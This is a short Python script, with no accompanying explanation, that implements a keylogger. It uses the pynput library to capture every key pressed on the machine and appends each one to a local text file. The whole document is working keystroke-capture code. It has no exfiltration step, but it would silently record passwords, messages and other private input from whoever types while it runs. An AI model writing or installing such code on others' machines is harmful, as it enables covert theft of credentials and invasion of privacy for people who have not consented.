from pynput import keyboard

# File to save the logs
log_file = "key_logg.txt"

# Function to write the key to the log file
def write_key(key):
    with open(log_file, "a") as f:
        f.write(str(key) + "\n")

# Function to handle key press events
def on_press(key):
    try:
        write_key(key.char)
    except AttributeError:
        write_key(key)

# Set up the listener for keyboard events
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()


